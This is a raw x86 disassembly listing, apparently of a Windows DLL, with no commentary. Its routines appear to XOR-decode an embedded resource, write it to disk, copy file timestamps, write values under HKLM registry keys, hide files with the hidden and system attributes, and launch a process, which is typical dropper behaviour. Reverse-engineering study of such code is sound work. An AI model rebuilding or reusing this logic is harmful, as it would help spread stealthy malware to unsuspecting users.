100016d6:	68 04 01 00 00       	push   $0x104
100016db:	50                   	push   %eax
100016dc:	56                   	push   %esi
100016dd:	e8 a4 f9 ff ff       	call   0x10001086
100016e2:	83 c4 18             	add    $0x18,%esp
100016e5:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
100016eb:	68 80 00 00 00       	push   $0x80
100016f0:	50                   	push   %eax
100016f1:	ff 15 68 e1 00 10    	call   *0x1000e168
100016f7:	80 7e 20 00          	cmpb   $0x0,0x20(%esi)
100016fb:	74 0b                	je     0x10001708
100016fd:	ff 75 0c             	push   0xc(%ebp)
10001700:	56                   	push   %esi
10001701:	e8 9a 00 00 00       	call   0x100017a0
10001706:	59                   	pop    %ecx
10001707:	59                   	pop    %ecx
10001708:	fe 4e 1a             	decb   0x1a(%esi)
1000170b:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
10001711:	50                   	push   %eax
10001712:	56                   	push   %esi
10001713:	e8 0b 00 00 00       	call   0x10001723
10001718:	fe 46 1a             	incb   0x1a(%esi)
1000171b:	59                   	pop    %ecx
1000171c:	59                   	pop    %ecx
1000171d:	8b c7                	mov    %edi,%eax
1000171f:	5f                   	pop    %edi
10001720:	5e                   	pop    %esi
10001721:	c9                   	leave
10001722:	c3                   	ret
10001723:	53                   	push   %ebx
10001724:	56                   	push   %esi
10001725:	33 f6                	xor    %esi,%esi
10001727:	39 74 24 10          	cmp    %esi,0x10(%esp)
1000172b:	74 6b                	je     0x10001798
1000172d:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
10001731:	3b de                	cmp    %esi,%ebx
10001733:	74 63                	je     0x10001798
10001735:	57                   	push   %edi
10001736:	33 c0                	xor    %eax,%eax
10001738:	bf 2c 06 00 00       	mov    $0x62c,%edi
1000173d:	80 34 18 cd          	xorb   $0xcd,(%eax,%ebx,1)
10001741:	40                   	inc    %eax
10001742:	3b c7                	cmp    %edi,%eax
10001744:	72 f7                	jb     0x1000173d
10001746:	55                   	push   %ebp
10001747:	56                   	push   %esi
10001748:	ff 74 24 1c          	push   0x1c(%esp)
1000174c:	ff 15 40 e1 00 10    	call   *0x1000e140
10001752:	8b e8                	mov    %eax,%ebp
10001754:	3b ee                	cmp    %esi,%ebp
10001756:	75 05                	jne    0x1000175d
10001758:	83 ce ff             	or     $0xffffffff,%esi
1000175b:	eb 2c                	jmp    0x10001789
1000175d:	57                   	push   %edi
1000175e:	53                   	push   %ebx
1000175f:	56                   	push   %esi
10001760:	6a 65                	push   $0x65
10001762:	68 28 00 01 10       	push   $0x10010028
10001767:	55                   	push   %ebp
10001768:	ff 15 44 e1 00 10    	call   *0x1000e144
1000176e:	8b f0                	mov    %eax,%esi
10001770:	6a 00                	push   $0x0
10001772:	f7 de                	neg    %esi
10001774:	1b f6                	sbb    %esi,%esi
10001776:	55                   	push   %ebp
10001777:	83 e6 02             	and    $0x2,%esi
1000177a:	4e                   	dec    %esi
1000177b:	4e                   	dec    %esi
1000177c:	ff 15 48 e1 00 10    	call   *0x1000e148
10001782:	85 c0                	test   %eax,%eax
10001784:	75 03                	jne    0x10001789
10001786:	6a fd                	push   $0xfffffffd
10001788:	5e                   	pop    %esi
10001789:	33 c0                	xor    %eax,%eax
1000178b:	5d                   	pop    %ebp
1000178c:	80 34 18 cd          	xorb   $0xcd,(%eax,%ebx,1)
10001790:	40                   	inc    %eax
10001791:	3b c7                	cmp    %edi,%eax
10001793:	72 f7                	jb     0x1000178c
10001795:	5f                   	pop    %edi
10001796:	eb 03                	jmp    0x1000179b
10001798:	83 ce ff             	or     $0xffffffff,%esi
1000179b:	8b c6                	mov    %esi,%eax
1000179d:	5e                   	pop    %esi
1000179e:	5b                   	pop    %ebx
1000179f:	c3                   	ret
100017a0:	55                   	push   %ebp
100017a1:	8b ec                	mov    %esp,%ebp
100017a3:	81 ec 24 04 00 00    	sub    $0x424,%esp
100017a9:	53                   	push   %ebx
100017aa:	56                   	push   %esi
100017ab:	57                   	push   %edi
100017ac:	6a 40                	push   $0x40
100017ae:	33 db                	xor    %ebx,%ebx
100017b0:	59                   	pop    %ecx
100017b1:	33 c0                	xor    %eax,%eax
100017b3:	8d bd e1 fc ff ff    	lea    -0x31f(%ebp),%edi
100017b9:	88 9d e0 fc ff ff    	mov    %bl,-0x320(%ebp)
100017bf:	6a 40                	push   $0x40
100017c1:	f3 ab                	rep stos %eax,%es:(%edi)
100017c3:	66 ab                	stos   %ax,%es:(%edi)
100017c5:	aa                   	stos   %al,%es:(%edi)
100017c6:	59                   	pop    %ecx
100017c7:	33 c0                	xor    %eax,%eax
100017c9:	8d bd e5 fd ff ff    	lea    -0x21b(%ebp),%edi
100017cf:	88 9d e4 fd ff ff    	mov    %bl,-0x21c(%ebp)
100017d5:	f3 ab                	rep stos %eax,%es:(%edi)
100017d7:	66 ab                	stos   %ax,%es:(%edi)
100017d9:	aa                   	stos   %al,%es:(%edi)
100017da:	6a 3f                	push   $0x3f
100017dc:	33 c0                	xor    %eax,%eax
100017de:	59                   	pop    %ecx
100017df:	8d bd e9 fe ff ff    	lea    -0x117(%ebp),%edi
100017e5:	88 9d e8 fe ff ff    	mov    %bl,-0x118(%ebp)
100017eb:	83 4d ec ff          	orl    $0xffffffff,-0x14(%ebp)
100017ef:	f3 ab                	rep stos %eax,%es:(%edi)
100017f1:	66 ab                	stos   %ax,%es:(%edi)
100017f3:	aa                   	stos   %al,%es:(%edi)
100017f4:	8d 45 fc             	lea    -0x4(%ebp),%eax
100017f7:	6a 03                	push   $0x3
100017f9:	50                   	push   %eax
100017fa:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
10001800:	50                   	push   %eax
10001801:	c6 45 fc 99          	movb   $0x99,-0x4(%ebp)
10001805:	c6 45 fd 3a          	movb   $0x3a,-0x3(%ebp)
10001809:	c6 45 fe 5c          	movb   $0x5c,-0x2(%ebp)
1000180d:	c7 45 f0 00 01 00 00 	movl   $0x100,-0x10(%ebp)
10001814:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
1000181b:	e8 fc ba 00 00       	call   0x1000d31c
10001820:	8b 75 08             	mov    0x8(%ebp),%esi
10001823:	8d 8d e0 fc ff ff    	lea    -0x320(%ebp),%ecx
10001829:	68 04 01 00 00       	push   $0x104
1000182e:	51                   	push   %ecx
1000182f:	8d 46 21             	lea    0x21(%esi),%eax
10001832:	50                   	push   %eax
10001833:	89 45 e8             	mov    %eax,-0x18(%ebp)
10001836:	e8 00 f8 ff ff       	call   0x1000103b
1000183b:	89 45 08             	mov    %eax,0x8(%ebp)
1000183e:	8a 45 0c             	mov    0xc(%ebp),%al
10001841:	88 85 e4 fd ff ff    	mov    %al,-0x21c(%ebp)
10001847:	8d 86 50 01 00 00    	lea    0x150(%esi),%eax
1000184d:	50                   	push   %eax
1000184e:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
10001854:	50                   	push   %eax
10001855:	e8 b6 ba 00 00       	call   0x1000d310
1000185a:	83 c4 20             	add    $0x20,%esp
1000185d:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
10001863:	53                   	push   %ebx
10001864:	50                   	push   %eax
10001865:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
1000186b:	50                   	push   %eax
1000186c:	ff 15 64 e1 00 10    	call   *0x1000e164
10001872:	85 c0                	test   %eax,%eax
10001874:	0f 84 f9 00 00 00    	je     0x10001973
1000187a:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000187d:	50                   	push   %eax
1000187e:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001881:	50                   	push   %eax
10001882:	53                   	push   %ebx
10001883:	68 3f 00 0f 00       	push   $0xf003f
10001888:	53                   	push   %ebx
10001889:	53                   	push   %ebx
1000188a:	8d 46 31             	lea    0x31(%esi),%eax
1000188d:	53                   	push   %ebx
1000188e:	50                   	push   %eax
1000188f:	68 02 00 00 80       	push   $0x80000002
10001894:	ff 15 44 e0 00 10    	call   *0x1000e044
1000189a:	3b c3                	cmp    %ebx,%eax
1000189c:	89 45 08             	mov    %eax,0x8(%ebp)
1000189f:	0f 85 ce 00 00 00    	jne    0x10001973
100018a5:	8d 45 f0             	lea    -0x10(%ebp),%eax
100018a8:	81 c6 30 01 00 00    	add    $0x130,%esi
100018ae:	50                   	push   %eax
100018af:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
100018b5:	50                   	push   %eax
100018b6:	8d 45 f8             	lea    -0x8(%ebp),%eax
100018b9:	50                   	push   %eax
100018ba:	53                   	push   %ebx
100018bb:	56                   	push   %esi
100018bc:	ff 75 f4             	push   -0xc(%ebp)
100018bf:	ff 15 40 e0 00 10    	call   *0x1000e040
100018c5:	3b c3                	cmp    %ebx,%eax
100018c7:	89 45 08             	mov    %eax,0x8(%ebp)
100018ca:	0f 84 a3 00 00 00    	je     0x10001973
100018d0:	6a 40                	push   $0x40
100018d2:	33 c0                	xor    %eax,%eax
100018d4:	59                   	pop    %ecx
100018d5:	8d bd dd fb ff ff    	lea    -0x423(%ebp),%edi
100018db:	88 9d dc fb ff ff    	mov    %bl,-0x424(%ebp)
100018e1:	68 00 01 00 00       	push   $0x100
100018e6:	f3 ab                	rep stos %eax,%es:(%edi)
100018e8:	66 ab                	stos   %ax,%es:(%edi)
100018ea:	aa                   	stos   %al,%es:(%edi)
100018eb:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
100018f1:	53                   	push   %ebx
100018f2:	50                   	push   %eax
100018f3:	e8 1e ba 00 00       	call   0x1000d316
100018f8:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
100018fe:	68 30 00 01 10       	push   $0x10010030
10001903:	50                   	push   %eax
10001904:	e8 5d ba 00 00       	call   0x1000d366
10001909:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
1000190f:	68 04 01 00 00       	push   $0x104
10001914:	50                   	push   %eax
10001915:	ff 75 e8             	push   -0x18(%ebp)
10001918:	e8 1e f7 ff ff       	call   0x1000103b
1000191d:	83 c4 20             	add    $0x20,%esp
10001920:	85 c0                	test   %eax,%eax
10001922:	75 4f                	jne    0x10001973
10001924:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
1000192a:	50                   	push   %eax
1000192b:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10001931:	50                   	push   %eax
10001932:	e8 d9 b9 00 00       	call   0x1000d310
10001937:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
1000193d:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
10001944:	50                   	push   %eax
10001945:	e8 16 ba 00 00       	call   0x1000d360
1000194a:	83 c4 0c             	add    $0xc,%esp
1000194d:	40                   	inc    %eax
1000194e:	89 45 f0             	mov    %eax,-0x10(%ebp)
10001951:	50                   	push   %eax
10001952:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10001958:	50                   	push   %eax
10001959:	ff 75 f8             	push   -0x8(%ebp)
1000195c:	53                   	push   %ebx
1000195d:	56                   	push   %esi
1000195e:	ff 75 f4             	push   -0xc(%ebp)
10001961:	ff 15 4c e0 00 10    	call   *0x1000e04c
10001967:	ff 75 f4             	push   -0xc(%ebp)
1000196a:	89 45 08             	mov    %eax,0x8(%ebp)
1000196d:	ff 15 48 e0 00 10    	call   *0x1000e048
10001973:	8b 45 08             	mov    0x8(%ebp),%eax
10001976:	5f                   	pop    %edi
10001977:	5e                   	pop    %esi
10001978:	5b                   	pop    %ebx
10001979:	c9                   	leave
1000197a:	c3                   	ret
1000197b:	55                   	push   %ebp
1000197c:	8b ec                	mov    %esp,%ebp
1000197e:	81 ec 28 02 00 00    	sub    $0x228,%esp
10001984:	56                   	push   %esi
10001985:	8b 75 08             	mov    0x8(%ebp),%esi
10001988:	83 c8 ff             	or     $0xffffffff,%eax
1000198b:	85 f6                	test   %esi,%esi
1000198d:	0f 84 be 00 00 00    	je     0x10001a51
10001993:	80 a5 d8 fd ff ff 00 	andb   $0x0,-0x228(%ebp)
1000199a:	57                   	push   %edi
1000199b:	6a 40                	push   $0x40
1000199d:	33 c0                	xor    %eax,%eax
1000199f:	59                   	pop    %ecx
100019a0:	8d bd d9 fd ff ff    	lea    -0x227(%ebp),%edi
100019a6:	f3 ab                	rep stos %eax,%es:(%edi)
100019a8:	80 a5 dc fe ff ff 00 	andb   $0x0,-0x124(%ebp)
100019af:	6a 40                	push   $0x40
100019b1:	66 ab                	stos   %ax,%es:(%edi)
100019b3:	aa                   	stos   %al,%es:(%edi)
100019b4:	59                   	pop    %ecx
100019b5:	33 c0                	xor    %eax,%eax
100019b7:	8d bd dd fe ff ff    	lea    -0x123(%ebp),%edi
100019bd:	6a 07                	push   $0x7
100019bf:	f3 ab                	rep stos %eax,%es:(%edi)
100019c1:	66 ab                	stos   %ax,%es:(%edi)
100019c3:	aa                   	stos   %al,%es:(%edi)
100019c4:	59                   	pop    %ecx
100019c5:	33 c0                	xor    %eax,%eax
100019c7:	8d 7d e2             	lea    -0x1e(%ebp),%edi
100019ca:	c6 45 e1 3a          	movb   $0x3a,-0x1f(%ebp)
100019ce:	f3 ab                	rep stos %eax,%es:(%edi)
100019d0:	66 ab                	stos   %ax,%es:(%edi)
100019d2:	8a 45 0c             	mov    0xc(%ebp),%al
100019d5:	68 04 01 00 00       	push   $0x104
100019da:	88 45 e0             	mov    %al,-0x20(%ebp)
100019dd:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
100019e3:	50                   	push   %eax
100019e4:	56                   	push   %esi
100019e5:	e8 9c f6 ff ff       	call   0x10001086
100019ea:	68 38 00 01 10       	push   $0x10010038
100019ef:	e8 6c b9 00 00       	call   0x1000d360
100019f4:	50                   	push   %eax
100019f5:	8d 45 e0             	lea    -0x20(%ebp),%eax
100019f8:	50                   	push   %eax
100019f9:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
100019ff:	50                   	push   %eax
10001a00:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10001a06:	81 c6 50 01 00 00    	add    $0x150,%esi
10001a0c:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001a12:	56                   	push   %esi
10001a13:	50                   	push   %eax
10001a14:	e8 f7 b8 00 00       	call   0x1000d310
10001a19:	83 c4 24             	add    $0x24,%esp
10001a1c:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001a22:	50                   	push   %eax
10001a23:	ff 15 5c e1 00 10    	call   *0x1000e15c
10001a29:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001a2f:	6a 00                	push   $0x0
10001a31:	50                   	push   %eax
10001a32:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
10001a38:	50                   	push   %eax
10001a39:	ff 15 64 e1 00 10    	call   *0x1000e164
10001a3f:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001a45:	6a 06                	push   $0x6
10001a47:	50                   	push   %eax
10001a48:	ff 15 68 e1 00 10    	call   *0x1000e168
10001a4e:	33 c0                	xor    %eax,%eax
10001a50:	5f                   	pop    %edi
10001a51:	5e                   	pop    %esi
10001a52:	c9                   	leave
10001a53:	c3                   	ret
10001a54:	55                   	push   %ebp
10001a55:	8b ec                	mov    %esp,%ebp
10001a57:	81 ec 58 01 00 00    	sub    $0x158,%esp
10001a5d:	a0 6c 07 01 10       	mov    0x1001076c,%al
10001a62:	56                   	push   %esi
10001a63:	57                   	push   %edi
10001a64:	6a 40                	push   $0x40
10001a66:	88 85 a8 fe ff ff    	mov    %al,-0x158(%ebp)
10001a6c:	59                   	pop    %ecx
10001a6d:	33 c0                	xor    %eax,%eax
10001a6f:	8d bd a9 fe ff ff    	lea    -0x157(%ebp),%edi
10001a75:	f3 ab                	rep stos %eax,%es:(%edi)
10001a77:	66 ab                	stos   %ax,%es:(%edi)
10001a79:	33 f6                	xor    %esi,%esi
10001a7b:	39 75 08             	cmp    %esi,0x8(%ebp)
10001a7e:	aa                   	stos   %al,%es:(%edi)
10001a7f:	0f 84 a9 00 00 00    	je     0x10001b2e
10001a85:	6a 44                	push   $0x44
10001a87:	8d 45 ac             	lea    -0x54(%ebp),%eax
10001a8a:	56                   	push   %esi
10001a8b:	50                   	push   %eax
10001a8c:	e8 85 b8 00 00       	call   0x1000d316
10001a91:	6a 10                	push   $0x10
10001a93:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001a96:	56                   	push   %esi
10001a97:	50                   	push   %eax
10001a98:	e8 79 b8 00 00       	call   0x1000d316
10001a9d:	bf 04 01 00 00       	mov    $0x104,%edi
10001aa2:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001aa8:	57                   	push   %edi
10001aa9:	56                   	push   %esi
10001aaa:	50                   	push   %eax
10001aab:	e8 66 b8 00 00       	call   0x1000d316
10001ab0:	83 c4 24             	add    $0x24,%esp
10001ab3:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001ab9:	c7 45 ac 44 00 00 00 	movl   $0x44,-0x54(%ebp)
10001ac0:	57                   	push   %edi
10001ac1:	50                   	push   %eax
10001ac2:	68 40 00 01 10       	push   $0x10010040
10001ac7:	ff 15 6c e1 00 10    	call   *0x1000e16c
10001acd:	85 c0                	test   %eax,%eax
10001acf:	74 5d                	je     0x10001b2e
10001ad1:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001ad7:	68 3c 00 01 10       	push   $0x1001003c
10001adc:	50                   	push   %eax
10001add:	e8 2e b8 00 00       	call   0x1000d310
10001ae2:	8b 45 08             	mov    0x8(%ebp),%eax
10001ae5:	83 c0 09             	add    $0x9,%eax
10001ae8:	50                   	push   %eax
10001ae9:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001aef:	50                   	push   %eax
10001af0:	e8 1b b8 00 00       	call   0x1000d310
10001af5:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001afb:	50                   	push   %eax
10001afc:	e8 33 00 00 00       	call   0x10001b34
10001b01:	83 c4 14             	add    $0x14,%esp
10001b04:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001b07:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
10001b0e:	66 89 75 dc          	mov    %si,-0x24(%ebp)
10001b12:	50                   	push   %eax
10001b13:	8d 45 ac             	lea    -0x54(%ebp),%eax
10001b16:	50                   	push   %eax
10001b17:	56                   	push   %esi
10001b18:	56                   	push   %esi
10001b19:	56                   	push   %esi
10001b1a:	56                   	push   %esi
10001b1b:	56                   	push   %esi
10001b1c:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
10001b22:	56                   	push   %esi
10001b23:	50                   	push   %eax
10001b24:	56                   	push   %esi
10001b25:	ff 15 3c e1 00 10    	call   *0x1000e13c
10001b2b:	8b 75 f8             	mov    -0x8(%ebp),%esi
10001b2e:	8b c6                	mov    %esi,%eax
10001b30:	5f                   	pop    %edi
10001b31:	5e                   	pop    %esi
10001b32:	c9                   	leave
10001b33:	c3                   	ret
10001b34:	55                   	push   %ebp
10001b35:	8b ec                	mov    %esp,%ebp
10001b37:	83 ec 24             	sub    $0x24,%esp
10001b3a:	53                   	push   %ebx
10001b3b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10001b3f:	56                   	push   %esi
10001b40:	57                   	push   %edi
10001b41:	68 28 00 01 10       	push   $0x10010028
10001b46:	6a 66                	push   $0x66
10001b48:	ff 35 50 07 01 10    	push   0x10010750
10001b4e:	ff 15 4c e1 00 10    	call   *0x1000e14c
10001b54:	8b f0                	mov    %eax,%esi
10001b56:	33 db                	xor    %ebx,%ebx
10001b58:	3b f3                	cmp    %ebx,%esi
10001b5a:	0f 84 ce 00 00 00    	je     0x10001c2e
10001b60:	56                   	push   %esi
10001b61:	ff 35 50 07 01 10    	push   0x10010750
10001b67:	ff 15 50 e1 00 10    	call   *0x1000e150
10001b6d:	8b f8                	mov    %eax,%edi
10001b6f:	3b fb                	cmp    %ebx,%edi
10001b71:	0f 84 b7 00 00 00    	je     0x10001c2e
10001b77:	56                   	push   %esi
10001b78:	ff 35 50 07 01 10    	push   0x10010750
10001b7e:	ff 15 54 e1 00 10    	call   *0x1000e154
10001b84:	57                   	push   %edi
10001b85:	89 45 f8             	mov    %eax,-0x8(%ebp)
10001b88:	ff 15 58 e1 00 10    	call   *0x1000e158
10001b8e:	3b c3                	cmp    %ebx,%eax
10001b90:	89 45 f4             	mov    %eax,-0xc(%ebp)
10001b93:	0f 84 9e 00 00 00    	je     0x10001c37
10001b99:	bf 80 00 00 00       	mov    $0x80,%edi
10001b9e:	53                   	push   %ebx
10001b9f:	8b 35 28 e1 00 10    	mov    0x1000e128,%esi
10001ba5:	57                   	push   %edi
10001ba6:	6a 02                	push   $0x2
10001ba8:	53                   	push   %ebx
10001ba9:	6a 01                	push   $0x1
10001bab:	68 00 00 00 c0       	push   $0xc0000000
10001bb0:	ff 75 08             	push   0x8(%ebp)
10001bb3:	ff d6                	call   *%esi
10001bb5:	3b c3                	cmp    %ebx,%eax
10001bb7:	89 45 08             	mov    %eax,0x8(%ebp)
10001bba:	74 7b                	je     0x10001c37
10001bbc:	8d 4d f4             	lea    -0xc(%ebp),%ecx
10001bbf:	53                   	push   %ebx
10001bc0:	51                   	push   %ecx
10001bc1:	ff 75 f8             	push   -0x8(%ebp)
10001bc4:	ff 75 f4             	push   -0xc(%ebp)
10001bc7:	50                   	push   %eax
10001bc8:	ff 15 2c e1 00 10    	call   *0x1000e12c
10001bce:	8b 45 f8             	mov    -0x8(%ebp),%eax
10001bd1:	39 45 f4             	cmp    %eax,-0xc(%ebp)
10001bd4:	75 03                	jne    0x10001bd9
10001bd6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10001bd9:	53                   	push   %ebx
10001bda:	57                   	push   %edi
10001bdb:	6a 03                	push   $0x3
10001bdd:	53                   	push   %ebx
10001bde:	6a 01                	push   $0x1
10001be0:	68 00 00 00 80       	push   $0x80000000
10001be5:	68 48 00 01 10       	push   $0x10010048
10001bea:	ff d6                	call   *%esi
10001bec:	8b 3d 30 e1 00 10    	mov    0x1000e130,%edi
10001bf2:	8b f0                	mov    %eax,%esi
10001bf4:	3b f3                	cmp    %ebx,%esi
10001bf6:	74 2f                	je     0x10001c27
10001bf8:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001bfb:	50                   	push   %eax
10001bfc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10001bff:	50                   	push   %eax
10001c00:	8d 45 dc             	lea    -0x24(%ebp),%eax
10001c03:	50                   	push   %eax
10001c04:	56                   	push   %esi
10001c05:	ff 15 34 e1 00 10    	call   *0x1000e134
10001c0b:	85 c0                	test   %eax,%eax
10001c0d:	74 15                	je     0x10001c24
10001c0f:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001c12:	50                   	push   %eax
10001c13:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10001c16:	50                   	push   %eax
10001c17:	8d 45 dc             	lea    -0x24(%ebp),%eax
10001c1a:	50                   	push   %eax
10001c1b:	ff 75 08             	push   0x8(%ebp)
10001c1e:	ff 15 38 e1 00 10    	call   *0x1000e138
10001c24:	56                   	push   %esi
10001c25:	ff d7                	call   *%edi
10001c27:	ff 75 08             	push   0x8(%ebp)
10001c2a:	ff d7                	call   *%edi
10001c2c:	eb 09                	jmp    0x10001c37
10001c2e:	ff 15 60 e1 00 10    	call   *0x1000e160
10001c34:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001c37:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001c3a:	5f                   	pop    %edi
10001c3b:	5e                   	pop    %esi
10001c3c:	5b                   	pop    %ebx
10001c3d:	c9                   	leave
10001c3e:	c3                   	ret
10001c3f:	55                   	push   %ebp
10001c40:	8b ec                	mov    %esp,%ebp
10001c42:	83 ec 10             	sub    $0x10,%esp
10001c45:	53                   	push   %ebx
10001c46:	57                   	push   %edi
10001c47:	33 c0                	xor    %eax,%eax
10001c49:	8d 7d f2             	lea    -0xe(%ebp),%edi
10001c4c:	c6 45 f0 99          	movb   $0x99,-0x10(%ebp)
10001c50:	c6 45 f1 3a          	movb   $0x3a,-0xf(%ebp)
10001c54:	ab                   	stos   %eax,%es:(%edi)
10001c55:	ab                   	stos   %eax,%es:(%edi)
10001c56:	ab                   	stos   %eax,%es:(%edi)
10001c57:	66 ab                	stos   %ax,%es:(%edi)
10001c59:	8a 45 0c             	mov    0xc(%ebp),%al
10001c5c:	b3 64                	mov    $0x64,%bl
10001c5e:	84 c0                	test   %al,%al
10001c60:	74 34                	je     0x10001c96
10001c62:	88 45 f0             	mov    %al,-0x10(%ebp)
10001c65:	8b 45 08             	mov    0x8(%ebp),%eax
10001c68:	05 70 01 00 00       	add    $0x170,%eax
10001c6d:	56                   	push   %esi
10001c6e:	50                   	push   %eax
10001c6f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001c72:	50                   	push   %eax
10001c73:	e8 98 b6 00 00       	call   0x1000d310
10001c78:	59                   	pop    %ecx
10001c79:	88 5d f5             	mov    %bl,-0xb(%ebp)
10001c7c:	59                   	pop    %ecx
10001c7d:	6a 07                	push   $0x7
10001c7f:	5e                   	pop    %esi
10001c80:	ff 75 10             	push   0x10(%ebp)
10001c83:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001c86:	50                   	push   %eax
10001c87:	ff 15 68 e1 00 10    	call   *0x1000e168
10001c8d:	fe c3                	inc    %bl
10001c8f:	4e                   	dec    %esi
10001c90:	88 5d f5             	mov    %bl,-0xb(%ebp)
10001c93:	75 eb                	jne    0x10001c80
10001c95:	5e                   	pop    %esi
10001c96:	5f                   	pop    %edi
10001c97:	33 c0                	xor    %eax,%eax
10001c99:	5b                   	pop    %ebx
10001c9a:	c9                   	leave
10001c9b:	c3                   	ret
10001c9c:	55                   	push   %ebp
10001c9d:	8b ec                	mov    %esp,%ebp
10001c9f:	81 ec 14 02 00 00    	sub    $0x214,%esp
10001ca5:	53                   	push   %ebx
10001ca6:	56                   	push   %esi
10001ca7:	33 db                	xor    %ebx,%ebx
10001ca9:	57                   	push   %edi
10001caa:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10001cad:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
10001cb4:	e8 53 02 00 00       	call   0x10001f0c
10001cb9:	88 45 f8             	mov    %al,-0x8(%ebp)
10001cbc:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001cbf:	50                   	push   %eax
10001cc0:	e8 32 f9 ff ff       	call   0x100015f7
10001cc5:	85 c0                	test   %eax,%eax
10001cc7:	59                   	pop    %ecx
10001cc8:	0f 85 37 02 00 00    	jne    0x10001f05
10001cce:	6a 40                	push   $0x40
10001cd0:	8d bd f1 fe ff ff    	lea    -0x10f(%ebp),%edi
10001cd6:	59                   	pop    %ecx
10001cd7:	88 9d f0 fe ff ff    	mov    %bl,-0x110(%ebp)
10001cdd:	f3 ab                	rep stos %eax,%es:(%edi)
10001cdf:	66 ab                	stos   %ax,%es:(%edi)
10001ce1:	aa                   	stos   %al,%es:(%edi)
10001ce2:	be 04 01 00 00       	mov    $0x104,%esi
10001ce7:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001ced:	56                   	push   %esi
10001cee:	50                   	push   %eax
10001cef:	ff 35 50 07 01 10    	push   0x10010750
10001cf5:	ff 15 bc e0 00 10    	call   *0x1000e0bc
10001cfb:	85 c0                	test   %eax,%eax
10001cfd:	0f 84 02 02 00 00    	je     0x10001f05
10001d03:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001d06:	8b 3d b0 e1 00 10    	mov    0x1000e1b0,%edi
10001d0c:	05 50 01 00 00       	add    $0x150,%eax
10001d11:	50                   	push   %eax
10001d12:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001d18:	50                   	push   %eax
10001d19:	ff d7                	call   *%edi
10001d1b:	59                   	pop    %ecx
10001d1c:	85 c0                	test   %eax,%eax
10001d1e:	59                   	pop    %ecx
10001d1f:	0f 84 86 00 00 00    	je     0x10001dab
10001d25:	38 5d f8             	cmp    %bl,-0x8(%ebp)
10001d28:	74 0d                	je     0x10001d37
10001d2a:	ff 75 f8             	push   -0x8(%ebp)
10001d2d:	ff 75 fc             	push   -0x4(%ebp)
10001d30:	e8 62 f9 ff ff       	call   0x10001697
10001d35:	59                   	pop    %ecx
10001d36:	59                   	pop    %ecx
10001d37:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001d3a:	80 78 1a 01          	cmpb   $0x1,0x1a(%eax)
10001d3e:	76 0e                	jbe    0x10001d4e
10001d40:	6a 06                	push   $0x6
10001d42:	ff 75 f8             	push   -0x8(%ebp)
10001d45:	50                   	push   %eax
10001d46:	e8 f4 fe ff ff       	call   0x10001c3f
10001d4b:	83 c4 0c             	add    $0xc,%esp
10001d4e:	56                   	push   %esi
10001d4f:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001d55:	53                   	push   %ebx
10001d56:	50                   	push   %eax
10001d57:	e8 ba b5 00 00       	call   0x1000d316
10001d5c:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001d62:	56                   	push   %esi
10001d63:	50                   	push   %eax
10001d64:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001d67:	05 60 01 00 00       	add    $0x160,%eax
10001d6c:	50                   	push   %eax
10001d6d:	e8 c9 f2 ff ff       	call   0x1000103b
10001d72:	83 c4 18             	add    $0x18,%esp
10001d75:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001d7b:	50                   	push   %eax
10001d7c:	ff 15 14 e1 00 10    	call   *0x1000e114
